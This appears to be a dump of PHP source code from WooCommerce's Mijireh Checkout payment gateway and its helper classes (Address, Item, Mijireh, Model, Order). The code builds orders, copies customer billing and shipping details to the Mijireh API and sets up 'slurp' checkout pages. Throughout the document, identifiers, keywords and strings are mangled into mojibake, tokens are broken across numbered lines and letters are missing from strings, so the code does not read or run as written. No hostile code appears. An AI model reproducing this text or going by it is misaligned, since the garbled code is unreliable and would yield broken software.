( 'provides‡ fully PCI Compliant, secure wayo collect‡ndransmit credit card datao your…ayment gateway while keeping you in control ofhe design of your site. Mijireh supports‡ wide variety of…ayment gateways: Stripe, Authorize.net, PayPal,ƒWay, SagePay, Braintree, PayLeap,‡nd more.', 'woocommerce' ); ?></span>

174 <
p
><
a
 
h»f
="h‰p://£cu».mijœeh.com/signup" 
rg‘
="_bÏnk" 
şass
="bu‰Ú bu‰Ú-´im¬y"><?
php
 
	`_e
( 'Join for free', 'woocommerce' ); ?></a> <a href="http://www.mijireh.com/integrations/woocommerce/"arget="_blank" class="button"><?php _e( 'Learn more‡bout WooCommerce‡nd Mijireh', 'woocommerce' ); ?></a></p>

176 </
div
>

177 <?
php
 : ?>

178 <
p
><
a
 
h»f
="h‰p://www.mijœeh.com/š‹g¿tiÚs/woocomm”û/">
Mijœeh
 
Checkout
</a> <?
php
 
	`_e
( 'provides‡ fully PCI Compliant, secure wayo collect‡ndransmit credit card datao your…ayment gateway while keeping you in control ofhe design of your site.', 'woocommerce' ); ?></p>

179 <?
php
 
’dif
; ?>

181 <
bË
 
şass
="form-table">

182 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

183 </
bË
><!--/.
fÜm
-table-->

184 <?
php


185 
	}
}

195 
public
 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {

197 
$this
->
	`š™_mijœeh
();

199 
$mj_Üd”
 = 
Ãw
 
	`Mijœeh_Ord”
();

200 
$wc_Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

203 
$™ems
 = 
$wc_Üd”
->
	`g‘_™ems
();

205 
	`fÜ—ch
Ğ
$™ems
 
as
 
$™em
 ) {

206 
$´oduù
 = 
$wc_Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

208 iàĞ
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) == 'yes' ) {

210 
$mj_Üd”
->
	`add_™em
Ğ
$™em
['Çme'], 
$wc_Üd”
->
	`g‘_™em_subtÙ®
Ğ$™em, 
Œue
, 
çl£
 ), $™em['qty'], 
$´oduù
->
	`g‘_sku
() );

214 
$mj_Üd”
->
	`add_™em
Ğ
$™em
['Çme'], 
$wc_Üd”
->
	`g‘_™em_subtÙ®
Ğ$™em, 
çl£
, 
Œue
 ), $™em['qty'], 
$´oduù
->
	`g‘_sku
() );

222 
$™ems
 = 
$wc_Üd”
->
	`g‘_ães
();

224 
	`fÜ—ch
Ğ
$™ems
 
as
 
$™em
 ) {

225 
$mj_Üd”
->
	`add_™em
Ğ
$™em
['Çme'], 
	`numb”_fÜm©
( $item['line_total'], 2, '.', ',' ), 1, '' );

229 
$blšg
 = 
Ãw
 
	`Mijœeh_Add»ss
();

230 
$blšg
->
fœ¡_Çme
 = 
$wc_Üd”
->
blšg_fœ¡_Çme
;

231 
$blšg
->
Ï¡_Çme
 = 
$wc_Üd”
->
blšg_Ï¡_Çme
;

232 
$blšg
->
¡»‘
 = 
$wc_Üd”
->
blšg_add»ss_1
;

233 
$blšg
->
­t_su™e
 = 
$wc_Üd”
->
blšg_add»ss_2
;

234 
$blšg
->
c™y
 = 
$wc_Üd”
->
blšg_c™y
;

235 
$blšg
->
¡©e_´ovšû
 = 
$wc_Üd”
->
blšg_¡©e
;

236 
$blšg
->
z_code
 = 
$wc_Üd”
->
blšg_po¡code
;

237 
$blšg
->
couÁry
 = 
$wc_Üd”
->
blšg_couÁry
;

238 
$blšg
->
com·ny
 = 
$wc_Üd”
->
blšg_com·ny
;

239 
$blšg
->
phÚe
 = 
$wc_Üd”
->
blšg_phÚe
;

240 iàĞ
$blšg
->
	`v®id©e
() )

241 
$mj_Üd”
->
	`£t_blšg_add»ss
Ğ
$blšg
 );

244 
$shpšg
 = 
Ãw
 
	`Mijœeh_Add»ss
();

245 
$shpšg
->
fœ¡_Çme
 = 
$wc_Üd”
->
shpšg_fœ¡_Çme
;

246 
$shpšg
->
Ï¡_Çme
 = 
$wc_Üd”
->
shpšg_Ï¡_Çme
;

247 
$shpšg
->
¡»‘
 = 
$wc_Üd”
->
shpšg_add»ss_1
;

248 
$shpšg
->
­t_su™e
 = 
$wc_Üd”
->
shpšg_add»ss_2
;

249 
$shpšg
->
c™y
 = 
$wc_Üd”
->
shpšg_c™y
;

250 
$shpšg
->
¡©e_´ovšû
 = 
$wc_Üd”
->
shpšg_¡©e
;

251 
$shpšg
->
z_code
 = 
$wc_Üd”
->
shpšg_po¡code
;

252 
$shpšg
->
couÁry
 = 
$wc_Üd”
->
shpšg_couÁry
;

253 
$shpšg
->
com·ny
 = 
$wc_Üd”
->
shpšg_com·ny
;

254 iàĞ
$shpšg
->
	`v®id©e
() )

255 
$mj_Üd”
->
	`£t_shpšg_add»ss
Ğ
$shpšg
 );

258 
$mj_Üd”
->
fœ¡_Çme
 = 
$wc_Üd”
->
blšg_fœ¡_Çme
;

259 
$mj_Üd”
->
Ï¡_Çme
 = 
$wc_Üd”
->
blšg_Ï¡_Çme
;

260 
$mj_Üd”
->
ema
 = 
$wc_Üd”
->
blšg_ema
;

263 
$mj_Üd”
->
tÙ®
 = 
$wc_Üd”
->
	`g‘_tÙ®
();

264 
$mj_Üd”
->
discouÁ
 = 
$wc_Üd”
->
	`g‘_tÙ®_discouÁ
();

266 iàĞ
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) == 'yes' ) {

267 
$mj_Üd”
->
shpšg
 = 
	`round
Ğ
$wc_Üd”
->
	`g‘_tÙ®_shpšg
(è+ $wc_Üd”->
	`g‘_shpšg_x
(), 2 );

268 
$mj_Üd”
->
show_x
 = 
çl£
;

270 
$mj_Üd”
->
shpšg
 = 
	`round
Ğ
$wc_Üd”
->
	`g‘_tÙ®_shpšg
(), 2 );

271 
$mj_Üd”
->
x
 = 
$wc_Üd”
->
	`g‘_tÙ®_x
();

275 
$mj_Üd”
->
	`add_m‘a_d©a
Ğ'wc_Üd”_id', 
$Üd”_id
 );

278 
$mj_Üd”
->
»tuº_u¾
 = 
	`WC
()->
	`­i_»que¡_u¾
( 'WC_Gateway_Mijireh' );

281 
$mj_Üd”
->
·¹Ãr_id
 = 'woo';

283 
Œy
 {

284 
$mj_Üd”
->
	`ü—‹
();

285 
$»suÉ
 = 
	`¬¿y
(

287 '»dœeù' => 
$mj_Üd”
->
checkout_u¾


289  
$»suÉ
;

290 } 
	`ÿtch
 (
Mijœeh_Exû±iÚ
 
$e
) {

291 
	`wc_add_nÙiû
Ğ
	`__
Ğ'Mijœehƒ¼Ü:', 'woocomm”û' ) . 
$e
->
	`g‘Mes§ge
(), 'error' );

293 
	}
}

301 
public
 
funùiÚ
 
	$š™_mijœeh
() {

302 iàĞ! 
	`şass_exi¡s
( 'Mijireh' ) ) {

303 
»quœe_Úû
 'includes/Mijireh.php';

305 iàĞ! 
	`is£t
Ğ
$this
 ) ) {

306 
$£‰šgs
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_' . 'mijœeh_checkout' . '_£‰šgs', 
nuÎ
 );

307 
$key
 = ! 
	`em±y
Ğ
$£‰šgs
['access_key'] ) ? $settings['access_key'] : '';

309 
$key
 = 
$this
->
acûss_key
;

312 
Mijœeh
::
$acûss_key
 = 
$key
;

314 
	}
}

323 
public
 
funùiÚ
 
	$·ge_¦u½
() {

325 
£lf
::
	`š™_mijœeh
();

327 
$·ge
 = 
	`g‘_·ge
Ğ
	`absšt
Ğ
$_POST
['page_id'] ) );

328 
$u¾
 = 
	`g‘_³rm®šk
Ğ
$·ge
->
ID
 );

329 
$job_id
 = 
$u¾
;

330 iàĞ
	`wp_upd©e_po¡
Ğ
	`¬¿y
Ğ'ID' => 
$·ge
->
ID
, 'post_status' => 'publish' ) ) ) {

331 
$job_id
 = 
Mijœeh
::
	`¦u½
Ğ
$u¾
, 
$·ge
->
ID
, 
	`¡r_»¶aû
Ğ'h‰ps:', 'h‰p:', 
	`add_qu”y_¬g
Ğ'wc-­i', 'WC_G©eway_Mijœeh', 
	`home_u¾
( '/' ) ) ) );

333 
echo
 
$job_id
;

334 
d›
;

335 
	}
}

345 
public
 
funùiÚ
 
	$add_·ge_¦u½_m‘a
() {

346 
glob®
 
$woocomm”û
;

348 iàĞ
£lf
::
	`is_¦u½_·ge
() ) {

349 
	`wp_’queue_¡yË
Ğ'mijœeh_css', 
	`WC
()->
	`¶ugš_u¾
() . '/includes/gateways/mijireh/assets/css/mijireh.css' );

350 
	`wp_’queue_süt
Ğ'push”', 'h‰ps://d3dy5gm8yhk7.şoudäÚt.Ãt/1.11/push”.mš.js', 
nuÎ
, 
çl£
, 
Œue
 );

351 
	`wp_’queue_süt
Ğ'·ge_¦u½', 
	`WC
()->
	`¶ugš_u¾
(è. '/šşudes/g©eways/mijœeh/as£ts/js/·ge_¦u½.js', 
	`¬¿y
('jqu”y'), 
çl£
, 
Œue
 );

353 
	`add_m‘a_box
(

356 
	`¬¿y
( 'WC_Gateway_Mijireh', 'draw_page_slurp_meta_box' ),

362 
	}
}

371 
public
 
funùiÚ
 
	$is_¦u½_·ge
() {

372 
glob®
 
$po¡
;

373 
$is_¦u½
 = 
çl£
;

374 iàĞ
	`is£t
Ğ
$po¡
 ) && 
	`is_objeù
( $post ) ) {

375 
$cÚ‹Á
 = 
$po¡
->
po¡_cÚ‹Á
;

376 iàĞ
	`¡½os
Ğ
$cÚ‹Á
, '{{mj-checkout-fÜm}}'è!=ğ
çl£
 ) {

377 
$is_¦u½
 = 
Œue
;

380  
$is_¦u½
;

381 
	}
}

391 
public
 
funùiÚ
 
	$d¿w_·ge_¦u½_m‘a_box
Ğ
$po¡
 ) {

392 
glob®
 
$woocomm”û
;

394 
£lf
::
	`š™_mijœeh
();

396 
echo
 "<div id='mijireh_notice' class='mijireh-info‡lert-message info' data-alert='alert'>";

397 
echo
 "<h2>Slurp your custom checkout…age!</h2>";

398 
echo
 "<p>Gethe…age designed just how you want‡nd when you're„eady, clickhe button below‡nd slurp it„ight up.</p>";

399 
echo
 "<div id='slurp_progress' class='meter…rogress…rogress-info…rogress-striped‡ctive' style='display:‚one;'><div id='slurp_progress_bar' class='bar' style='width: 20%;'>Slurping...</div></div>";

400 
echo
 "<p><¨h»f='#' id='·ge_¦u½'„–=". 
$po¡
->
ID
 ." class='button-primary'>Slurp This Page!</a> ";

401 
echo
 '<¨şass="nobŞd" h»f="' . 
Mijœeh
::
	`´ev›w_checkout_lšk
() . '" id="view_slurp"arget="_new">Preview Checkout Page</a></p>';

402 
echo
 "</div>";

403 
	}
}

	@includes/gateways/mijireh/includes/Address.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 şas 
	cMijœeh_Add»ss
 
ex‹nds
 
	mMijœeh_Mod–
 {

7 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

8 
$this
->
	`š™
();

11 
public
 
funùiÚ
 
	$š™
() {

12 
$this
->
_d©a
 = 
	`¬¿y
(

24 
	}
}

30 
public
 
funùiÚ
 
	$v®id©e
() {

31 
$is_v®id
 = 
$this
->
	`_check_»quœed_f›lds
();

32  
$is_v®id
;

33 
	}
}

40 
´iv©e
 
funùiÚ
 
	$_check_»quœed_f›lds
() {

41 
$·ss
 = 
Œue
;

42 
$f›lds
 = 
	`¬¿y
('street', 'city', 'state_province', 'zip_code', 'country');

43 
	`fÜ—ch
(
$f›lds
 
as
 
$f
) {

44 if(
	`em±y
(
$this
->
_d©a
[
$f
])) {

45 
$·ss
 = 
çl£
;

46 
$this
->
	`add_”rÜ
("$f is„equired");

49  
$·ss
;

50 
	}
}

	@includes/gateways/mijireh/includes/Item.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 şas 
	cMijœeh_I‹m
 
ex‹nds
 
	mMijœeh_Mod–
 {

7 
´iv©e
 
funùiÚ
 
	$_š™
() {

8 
$this
->
_d©a
 = 
	`¬¿y
(

9 'Çme' => 
nuÎ
,

10 '´iû' => 
nuÎ
,

12 'sku' => 
nuÎ


16 
´iv©e
 
funùiÚ
 
	$_check_»quœed_f›lds
() {

17 if(
	`em±y
(
$this
->
_d©a
['name'])) {

18 
$this
->
	`add_”rÜ
('item‚ame is„equired.');

21 if(!
	`is_num”ic
(
$this
->
_d©a
['price'])) {

22 
$this
->
	`add_”rÜ
('price must be‡‚umber.');

24 
	}
}

26 
´iv©e
 
funùiÚ
 
	$_check_quªt™y
() {

27 if(
$this
->
_d©a
['quantity'] < 1) {

28 
$this
->
	`add_”rÜ
('quantity must be greaterhan orƒqualo 1');

30 
	}
}

32 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

33 
$this
->
	`_š™
();

34 
	}
}

36 
public
 
funùiÚ
 
	$__g‘
(
$key
) {

37 
$v®ue
 = 
çl£
;

38 if(
$key
 == 'total') {

39 
$v®ue
 = 
$this
->
_d©a
['price'] * $this->_data['quantity'];

40 
$v®ue
 = 
	`numb”_fÜm©
($value, 2, '.', '');

43 
$v®ue
 = 
·»Á
::
	`__g‘
(
$key
);

45  
$v®ue
;

46 
	}
}

48 
public
 
funùiÚ
 
	$g‘_d©a
() {

49 
$d©a
 = 
·»Á
::
	`g‘_d©a
();

50 
$d©a
['tÙ®'] = 
$this
->
tÙ®
;

51  
$d©a
;

52 
	}
}

54 
public
 
funùiÚ
 
	$v®id©e
() {

55 
$this
->
	`_check_»quœed_f›lds
();

56 
$this
->
	`_check_quªt™y
();

57  
	`couÁ
(
$this
->
_”rÜs
) == 0;

58 
	}
}

	@includes/gateways/mijireh/includes/Mijireh.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 
	g$roÙ_dœ
 = 
dœÇme
(
__FILE__
è. 
DIRECTORY_SEPARATOR
;

8 
»quœe_Úû
 
	g$roÙ_dœ
 . 'Rest.php';

9 
»quœe_Úû
 
	g$roÙ_dœ
 . 'RestJSON.php';

10 
»quœe_Úû
 
	g$roÙ_dœ
 . 'Model.php';

11 
»quœe_Úû
 
	g$roÙ_dœ
 . 'Address.php';

12 
»quœe_Úû
 
	g$roÙ_dœ
 . 'Item.php';

13 
»quœe_Úû
 
	g$roÙ_dœ
 . 'Order.php';

15 şas 
	cMijœeh_Exû±iÚ
 
ex‹nds
 
	mExû±iÚ
 {}

16 şas 
	cMijœeh_Cl›ÁE¼Ü
 
ex‹nds
 
	mMijœeh_Exû±iÚ
 {}

17 şas 
	cMijœeh_BadReque¡
 
ex‹nds
 
	mMijœeh_Cl›ÁE¼Ü
 {}

18 şas 
	cMijœeh_UÇuthÜized
 
ex‹nds
 
	mMijœeh_Cl›ÁE¼Ü
 {}

19 şas 
	cMijœeh_NÙFound
 
ex‹nds
 
	mMijœeh_Cl›ÁE¼Ü
 {}

20 şas 
	cMijœeh_S”v”E¼Ü
 
ex‹nds
 
	mMijœeh_Exû±iÚ
 {}

21 şas 
	cMijœeh_IÁ”ÇlE¼Ü
 
ex‹nds
 
	mMijœeh_S”v”E¼Ü
 {}

23 şas 
	cMijœeh
 {

26 
public
 
	m$ba£_u¾
 = 'https://secure.mijireh.com/';

27 
public
 
	m$u¾
 = 'https://secure.mijireh.com/api/1/';

29 
public
 
	m$acûss_key
;

34 
public
 
funùiÚ
 
	$¦u½
(
$u¾
, 
$·ge_id
, 
$»tuº_u¾
) {

35 
$u¾_fÜm©
 = '/^(https?):\/\/'.

50 if(!
	`´eg_m©ch
(
$u¾_fÜm©
, 
$u¾
)) {

51 
throw
 
Ãw
 
	`Mijœeh_NÙFound
('Unableo slurp invalid URL: $url');

54 
Œy
 {

55 
$»¡
 = 
Ãw
 
	`Mijœeh_Re¡
(
$u¾
);

56 
$d©a
 = 
	`¬¿y
(

57 'u¾' => 
$u¾
,

58 '·ge_id' => 
$·ge_id
,

59 '»tuº_u¾' => 
$»tuº_u¾


61 
$»¡
 = 
Ãw
 
	`Mijœeh_Re¡JSON
(
£lf
::
$u¾
);

62 
$»¡
->
	`£tupAuth
(
£lf
::
$acûss_key
, '');

63 
$»suÉ
 = 
$»¡
->
	`po¡
('¦u½s', 
$d©a
);

64  
$»suÉ
['job_id'];

66 
	`ÿtch
(
Mijœeh_Re¡_UÇuthÜized
 
$e
) {

67 
throw
 
Ãw
 
	`Mijœeh_UÇuthÜized
("Unauthorized. Please check your‡pi‡ccess key");

69 
	`ÿtch
(
Mijœeh_Re¡_NÙFound
 
$e
) {

70 
throw
 
Ãw
 
	`Mijœeh_NÙFound
("Mijœeh„esourû‚Ù found: " . 
$»¡
->
Ï¡_»que¡
['url']);

72 
	`ÿtch
(
Mijœeh_Re¡_Cl›ÁE¼Ü
 
$e
) {

73 
throw
 
Ãw
 
	`Mijœeh_Cl›ÁE¼Ü
(
$e
->
	`g‘Mes§ge
());

75 
	`ÿtch
(
Mijœeh_Re¡_S”v”E¼Ü
 
$e
) {

76 
throw
 
Ãw
 
	`Mijœeh_S”v”E¼Ü
(
$e
->
	`g‘Mes§ge
());

78 
	`ÿtch
(
Mijœeh_Re¡_UnknownRe¥Ú£
 
$e
) {

79 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('Unableo slurphe URL: $url');

86 
public
 
funùiÚ
 
	$g‘_¡Üe_šfo
() {

87 
$»¡
 = 
Ãw
 
	`Mijœeh_Re¡JSON
(
£lf
::
$u¾
);

88 
$»¡
->
	`£tupAuth
(
£lf
::
$acûss_key
, '');

89 
Œy
 {

90 
$»suÉ
 = 
$»¡
->
	`g‘
('store');

91  
$»suÉ
;

93 
	`ÿtch
(
Mijœeh_Re¡_BadReque¡
 
$e
) {

94 
throw
 
Ãw
 
	`Mijœeh_BadReque¡
(
$e
->
	`g‘Mes§ge
());

96 
	`ÿtch
(
Mijœeh_Re¡_UÇuthÜized
 
$e
) {

97 
throw
 
Ãw
 
	`Mijœeh_UÇuthÜized
("Unauthorized. Please check your‡pi‡ccess key");

99 
	`ÿtch
(
Mijœeh_Re¡_NÙFound
 
$e
) {

100 
throw
 
Ãw
 
	`Mijœeh_NÙFound
("Mijœeh„esourû‚Ù found: " . 
$»¡
->
Ï¡_»que¡
['url']);

102 
	`ÿtch
(
Mijœeh_Re¡_Cl›ÁE¼Ü
 
$e
) {

103 
throw
 
Ãw
 
	`Mijœeh_Cl›ÁE¼Ü
(
$e
->
	`g‘Mes§ge
());

105 
	`ÿtch
(
Mijœeh_Re¡_S”v”E¼Ü
 
$e
) {

106 
throw
 
Ãw
 
	`Mijœeh_S”v”E¼Ü
(
$e
->
	`g‘Mes§ge
());

108 
	}
}

110 
public
 
funùiÚ
 
	$´ev›w_checkout_lšk
() {

111 if(
	`em±y
(
Mijœeh
::
$acûss_key
)) {

112 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('Access key„equiredo view checkout…review');

115  
£lf
::
$ba£_u¾
 . 'checkout/' . s–f::
$acûss_key
;

116 
	}
}

	@includes/gateways/mijireh/includes/Model.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 şas 
	cMijœeh_Mod–
 {

7 
´Ùeùed
 
	m$_d©a
 = 
¬¿y
();

8 
´Ùeùed
 
	m$_”rÜs
 = 
¬¿y
();

17 
public
 
funùiÚ
 
	$__£t
(
$key
, 
$v®ue
) {

18 
$sucûss
 = 
çl£
;

19 if(
	`¬¿y_key_exi¡s
(
$key
, 
$this
->
_d©a
)) {

20 
$this
->
_d©a
[
$key
] = 
$v®ue
;

21 
$sucûss
 = 
Œue
;

23  
$sucûss
;

34 
public
 
funùiÚ
 
	$__g‘
(
$key
) {

35 
$v®ue
 = 
çl£
;

36 if(
	`¬¿y_key_exi¡s
(
$key
, 
$this
->
_d©a
)) {

37 
$v®ue
 = 
$this
->
_d©a
[
$key
];

46  
$v®ue
;

47 
	}
}

55 
public
 
funùiÚ
 
	$__is£t
(
$key
) {

56  
	`is£t
(
$this
->
_d©a
[
$key
]);

57 
	}
}

65 
public
 
funùiÚ
 
	$__un£t
(
$key
) {

66 if(
	`¬¿y_key_exi¡s
(
$key
, 
$this
->
_d©a
)) {

67 
$this
->
_d©a
[
$key
] = 
nuÎ
;

69 
	}
}

76 
public
 
funùiÚ
 
	$g‘_d©a
() {

77  
$this
->
_d©a
;

78 
	}
}

86 
public
 
funùiÚ
 
	$f›ld_exi¡s
(
$key
) {

87  
	`¬¿y_key_exi¡s
(
$key
, 
$this
->
_d©a
);

88 
	}
}

90 
public
 
funùiÚ
 
	$cİy_äom
(
¬¿y
 
$d©a
) {

91 
	`fÜ—ch
(
$d©a
 
as
 
$key
 => 
$v®ue
) {

92 if(
	`¬¿y_key_exi¡s
(
$key
, 
$this
->
_d©a
)) {

93 
$this
->
_d©a
[
$key
] = 
$v®ue
;

96 
	}
}

98 
public
 
funùiÚ
 
	$ş—r
() {

99 
	`fÜ—ch
(
$this
->
_d©a
 
as
 
$key
 => 
$v®ue
) {

100 if(
$key
 == 'id') {

101 
$this
->
_d©a
[
$key
] = 
nuÎ
;

104 
$this
->
_d©a
[
$key
] = '';

107 
	}
}

109 
public
 
funùiÚ
 
	$add_”rÜ
(
$”rÜ_mes§ge
) {

110 if(!
	`em±y
(
$”rÜ_mes§ge
)) {

111 
$this
->
_”rÜs
[] = 
$”rÜ_mes§ge
;

113 
	}
}

115 
public
 
funùiÚ
 
	$ş—r_”rÜs
() {

116 
$this
->
_”rÜs
 = 
	`¬¿y
();

117 
	}
}

119 
public
 
funùiÚ
 
	$g‘_”rÜs
() {

120  
$this
->
_”rÜs
;

121 
	}
}

123 
public
 
funùiÚ
 
g‘_”rÜ_lšes
(
$glue
="\n") {

124 
$”rÜ_lšes
 = '';

125 if(
couÁ
(
$this
->
_”rÜs
)) {

126 
	g$”rÜ_lšes
 = 
im¶ode
(
$glue
, 
$this
->
_”rÜs
);

128  
	g$”rÜ_lšes
;

131 
public
 
funùiÚ
 
	$is_v®id
() {

132  
	`couÁ
(
$this
->
_”rÜs
) == 0;

133 
	}
}

	@includes/gateways/mijireh/includes/Order.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 şas 
	cMijœeh_Ord”
 
ex‹nds
 
	mMijœeh_Mod–
 {

7 
´iv©e
 
funùiÚ
 
	$_š™
() {

8 
$this
->
_d©a
 = 
	`¬¿y
(

9 '·¹Ãr_id' => 
nuÎ
,

10 'Üd”_numb”' => 
nuÎ
,

11 'mode' => 
nuÎ
,

12 '¡©us' => 
nuÎ
,

13 'Üd”_d©e' => 
nuÎ
,

14 '_add»ss' => 
nuÎ
,

15 'checkout_u¾' => 
nuÎ
,

18 '™ems' => 
	`¬¿y
(),

22 'm‘a_d©a' => 
	`¬¿y
(),

26 'shpšg_add»ss' => 
	`¬¿y
(),

27 'blšg_add»ss' => 
	`¬¿y
(),

28 'show_x' => 
Œue


32 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$Üd”_numb”
=
nuÎ
) {

33 
$this
->
	`_š™
();

34 if(
	`is£t
(
$Üd”_numb”
)) {

35 
$this
->
	`lßd
(
$Üd”_numb”
);

37 
	}
}

39 
public
 
funùiÚ
 
	$lßd
(
$Üd”_numb”
) {

40 if(
	`¡¾’
(
Mijœeh
::
$acûss_key
) < 5) {

41 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('missing mijireh‡ccess key');

44 
$»¡
 = 
Ãw
 
	`Mijœeh_Re¡JSON
(
Mijœeh
::
$u¾
);

45 
$»¡
->
	`£tupAuth
(
Mijœeh
::
$acûss_key
, '');

46 
Œy
 {

47 
$Üd”_d©a
 = 
$»¡
->
	`g‘
("orders/$order_number");

48 
$this
->
	`cİy_äom
(
$Üd”_d©a
);

49  
$this
;

51 
	`ÿtch
(
Mijœeh_Re¡_BadReque¡
 
$e
) {

52 
throw
 
Ãw
 
	`Mijœeh_BadReque¡
(
$e
->
	`g‘Mes§ge
());

54 
	`ÿtch
(
Mijœeh_Re¡_UÇuthÜized
 
$e
) {

55 
throw
 
Ãw
 
	`Mijœeh_UÇuthÜized
("Unauthorized. Please check your‡pi‡ccess key");

57 
	`ÿtch
(
Mijœeh_Re¡_NÙFound
 
$e
) {

58 
throw
 
Ãw
 
	`Mijœeh_NÙFound
("Mijœeh„esourû‚Ù found: " . 
$»¡
->
Ï¡_»que¡
['url']);

60 
	`ÿtch
(
Mijœeh_Re¡_Cl›ÁE¼Ü
 
$e
) {

61 
throw
 
Ãw
 
	`Mijœeh_Cl›ÁE¼Ü
(
$e
->
	`g‘Mes§ge
());

63 
	`ÿtch
(
Mijœeh_Re¡_S”v”E¼Ü
 
$e
) {

64 
throw
 
Ãw
 
	`Mijœeh_S”v”E¼Ü
(
$e
->
	`g‘Mes§ge
());

66 
	}
}

68 
public
 
funùiÚ
 
	$cİy_äom
(
$Üd”_d©a
) {

69 
	`fÜ—ch
(
$Üd”_d©a
 
as
 
$key
 => 
$v®ue
) {

70 if(
$key
 == 'items') {

71 if(
	`is_¬¿y
(
$v®ue
)) {

72 
$this
->
	`ş—r_™ems
();

73 
	`fÜ—ch
(
$v®ue
 
as
 
$™em_¬¿y
) {

74 
$™em
 = 
Ãw
 
	`Mijœeh_I‹m
();

75 
$™em
->
	`cİy_äom
(
$™em_¬¿y
);

76 
$this
->
	`add_™em
(
$™em
);

80 
	`–£if
(
$key
 == 'shipping_address') {

81 if(
	`is_¬¿y
(
$v®ue
)) {

82 
$add»ss
 = 
Ãw
 
	`Mijœeh_Add»ss
();

83 
$add»ss
->
	`cİy_äom
(
$v®ue
);

84 
$this
->
	`£t_shpšg_add»ss
(
$add»ss
);

87 
	`–£if
(
$key
 == 'billing_address') {

88 if(
	`is_¬¿y
(
$v®ue
)) {

89 
$add»ss
 = 
Ãw
 
	`Mijœeh_Add»ss
();

90 
$add»ss
->
	`cİy_äom
(
$v®ue
);

91 
$this
->
	`£t_blšg_add»ss
(
$add»ss
);

94 
	`–£if
(
$key
 == 'meta_data') {

95 if(
	`is_¬¿y
(
$v®ue
)) {

96 
$this
->
	`ş—r_m‘a_d©a
();

97 
$this
->
_d©a
['m‘a_d©a'] = 
$v®ue
;

101 
$this
->
$key
 = 
$v®ue
;

105 if(!
$this
->
	`v®id©e
()) {

106 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('šv®id ord” hyd¿tiÚ: ' . 
$this
->
	`g‘_”rÜs_lšes
());

109  
$this
;

110 
	}
}

112 
public
 
funùiÚ
 
	$ü—‹
() {

113 if(
	`¡¾’
(
Mijœeh
::
$acûss_key
) < 5) {

114 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('missing mijireh‡ccess key');

117 if(!
$this
->
	`v®id©e
()) {

118 
$”rÜ_mes§ge
 = 'uÇbËØü—‹ ord”: ' . 
$this
->
	`g‘_”rÜ_lšes
();

119 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
(
$”rÜ_mes§ge
);

122 
$»¡
 = 
Ãw
 
	`Mijœeh_Re¡JSON
(
Mijœeh
::
$u¾
);

123 
$»¡
->
	`£tupAuth
(
Mijœeh
::
$acûss_key
, '');

124 
Œy
 {

125 
$»suÉ
 = 
$»¡
->
	`po¡
('Üd”s', 
$this
->
	`g‘_d©a
());

126 
$this
->
	`cİy_äom
(
$»suÉ
);

127  
$this
;

129 
	`ÿtch
(
Mijœeh_Re¡_BadReque¡
 
$e
) {

130 
throw
 
Ãw
 
	`Mijœeh_BadReque¡
(
$e
->
	`g‘Mes§ge
());

132 
	`ÿtch
(
Mijœeh_Re¡_UÇuthÜized
 
$e
) {

133 
throw
 
Ãw
 
	`Mijœeh_UÇuthÜized
("Unauthorized. Please check your‡pi‡ccess key");

135 
	`ÿtch
(
Mijœeh_Re¡_NÙFound
 
$e
) {

136 
throw
 
Ãw
 
	`Mijœeh_NÙFound
("Mijœeh„esourû‚Ù found: " . 
$»¡
->
Ï¡_»que¡
['url']);

138 
	`ÿtch
(
Mijœeh_Re¡_Cl›ÁE¼Ü
 
$e
) {

139 
throw
 
Ãw
 
	`Mijœeh_Cl›ÁE¼Ü
(
$e
->
	`g‘Mes§ge
());

141 
	`ÿtch
(
Mijœeh_Re¡_S”v”E¼Ü
 
$e
) {

142 
throw
 
Ãw
 
	`Mijœeh_S”v”E¼Ü
(
$e
->
	`g‘Mes§ge
());

144 
	}
}

149 
public
 
funùiÚ
 
	$g‘_d©a
() {

150 
$d©a
 = 
·»Á
::
	`g‘_d©a
();

151 if(
	`couÁ
(
$d©a
['m‘a_d©a']è=ğ0è{ 
	`un£t
($data['meta_data']); }

152 if(
	`couÁ
(
$d©a
['shpšg_add»ss']è=ğ0è{ 
	`un£t
($data['shipping_address']); }

153 if(
	`couÁ
(
$d©a
['blšg_add»ss']è=ğ0è{ 
	`un£t
($data['billing_address']); }

154  
$d©a
;

155 
	}
}

168 
public
 
funùiÚ
 
add_™em
(
$Çme
, 
$´iû
=0, 
$quªt™y
=1, 
$sku
='') {

169 
$™em
 = '';

170 if(
is_objeù
(
$Çme
è&& 
g‘_şass
($name) == 'Mijireh_Item') {

171 
$™em
 = 
$Çme
;

174 
	g$™em
 = 
Ãw
 
Mijœeh_I‹m
();

175 
	g$™em
->
	gÇme
 = 
$Çme
;

176 
	g$™em
->
	g´iû
 = 
$´iû
;

177 
	g$™em
->
	gquªt™y
 = 
$quªt™y
;

178 
	g$™em
->
	gsku
 = 
$sku
;

181 if(
	g$™em
->
v®id©e
()) {

182 
	g$this
->
	g_d©a
['™ems'][] = 
$™em
->
g‘_d©a
();

183  
	g$this
->
™em_couÁ
();

186 
	g$”rÜs
 = 
im¶ode
(' ', 
$™em
->
g‘_”rÜs
());

187 
throw
 
Ãw
 
Mijœeh_Exû±iÚ
('uÇbËØadd inv®id i‹mØÜd” :: ' . 
